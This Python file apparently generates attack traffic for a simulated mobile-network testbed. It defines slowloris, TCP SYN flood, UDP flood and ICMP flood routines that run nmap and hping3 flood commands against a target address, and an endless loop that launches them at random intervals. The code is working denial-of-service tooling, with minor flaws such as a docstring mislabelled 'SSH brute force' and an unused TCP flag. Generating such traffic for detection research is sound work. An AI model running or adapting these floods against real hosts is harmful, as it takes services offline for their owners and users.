import subprocess
import random
import time

from constants import *

# DDoS attacks such as Slowloris, SYN flood, and UDP flood

def slowloris(src_ip: str, dst_ip: str = TARGET_ADDR):
    """
    Run SSH brute force attack from the given IP address.
    
    Parameters:
        ip (str): IP address to run the command from.
    
    Returns
        None
    """
    # Run command
    subprocess.run(
        [f"./nr-binder", src_ip, f"nmap -S {src_ip} --script +http-slowloris -p {HTTP_PORT} {dst_ip}"],
        capture_output=True,
        cwd=BINDER_DIR,
    )

def tcp_flood(src_ip: str, dst_ip: str = TARGET_ADDR):
    """
    Run TCP flood attack from the given IP address.
    
    Parameters:
        ip (str): IP address to run the command from.
    
    Returns
        None
    """
    # Choose tcp flags
    tcp_flag = random.choice(HPING_FLAGS)
    # Run command
    subprocess.run(
        [f"./nr-binder", src_ip, f"hping3 -d 65495 -c 1000000 --syn --flood {dst_ip}"],
        capture_output=True,
        cwd=BINDER_DIR,
    )

def udp_flood(src_ip: str, dst_ip: str = TARGET_ADDR):
    """
    Run UDP flood attack from the given IP address.
    
    Parameters:
        ip (str): IP address to run the command from.
    
    Returns
        None
    """
    # Run command
    subprocess.run(
        [f"./nr-binder", src_ip, f"hping3 --udp -c 1000000000 --flood {dst_ip}"],
        capture_output=True,
        cwd=BINDER_DIR,
    )

def ping_flood(src_ip: str, dst_ip: str = TARGET_ADDR):
    """
    Run ICMP flood attack from the given IP address.
    
    Parameters:
        ip (str): IP address to run the command from.
    
    Returns
        None
    """
    # Run command
    subprocess.run(
        [f"./nr-binder", src_ip, f"hping3 --icmp -c 1000000000 --flood {dst_ip}"],
        capture_output=True,
        cwd=BINDER_DIR,
    )

DDOS_LIST = (
    slowloris,
    tcp_flood,
    udp_flood,
    ping_flood,
    # Add more DDoS functions here
)

def ddos_ue(ip: str) -> None:
    """
    Generate DDoS UE traffic.
    
    Parameters:
        ip (str): IP address to generate traffic for.
    
    Returns:
        None
    """
    try:
        # Generate DDoS traffic
        while True:
            # Randomly select a benign function
            func = random.choice(DDOS_LIST)
            # Call the function with the IP address
            func(ip)
            # Sleep for a random interval
            time.sleep(random.randint(1, SLEEP_TIME))
    except Exception as e:
        print(f"Error in ddos_ue, IP address {ip}: {e}")
